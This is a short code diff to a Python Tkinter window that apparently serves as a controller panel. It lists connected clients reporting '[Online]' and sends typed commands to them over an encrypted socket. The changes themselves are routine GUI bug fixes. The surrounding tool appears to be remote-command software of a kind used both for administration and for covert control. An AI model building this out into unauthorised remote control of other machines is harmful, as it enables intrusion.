@@ -114,7 +114,8 @@ class MainWindow(Tk):
         client_frame.grid(row = 1, column = 1, columnspan = 3)
 
         Label(client_frame, text = 'Client list').grid(row = 0, column = 1)
-        self.options['clients'] = Listbox(client_frame, width = 120, height = 30).grid(row = 1, column = 1)
+        self.options['clients'] = Listbox(client_frame, width = 120, height = 30)
+        self.options['clients'].grid(row = 1, column = 1)
 
         # Log Frame
         Label(client_frame, text = 'Log').grid(row = 0, column = 2)
@@ -138,7 +139,7 @@ class MainWindow(Tk):
             server_thread.daemon = True
             server_thread.start()
 
-            self.options['log'].insert('1.0', '[%s %s] Connected to <%s:%s>' % (time.strftime('%x'), time.strftime('%X'), self.options['server'].get(), self.options['port'].get()), 'green')
+            self.options['log'].insert('1.0', '[%s %s] Connected to <%s:%s>\n' % (time.strftime('%x'), time.strftime('%X'), self.options['server'].get(), self.options['port'].get()), 'green')
         except Exception as e:
             self.options['log'].insert('1.0', '[ERROR] Failed to connect: %s\n' % e, 'red')
 
@@ -159,8 +160,10 @@ class MainWindow(Tk):
                         sys.exit(1)
                     else:
                         # print data
-                        print('%s' % data)
-                        self.options['log'].insert('1.0', '%s\n' % data, 'yellow')
+                        if data.startswith('[Online]'):
+                            self.options['clients'].insert(END, data)
+                        else:
+                            self.options['log'].insert('1.0', '%s\n' % data, 'yellow')
 
     def send_command(self):
         s.send(cipher.encrypt('COMMAND$' + self.options['command'].get()))
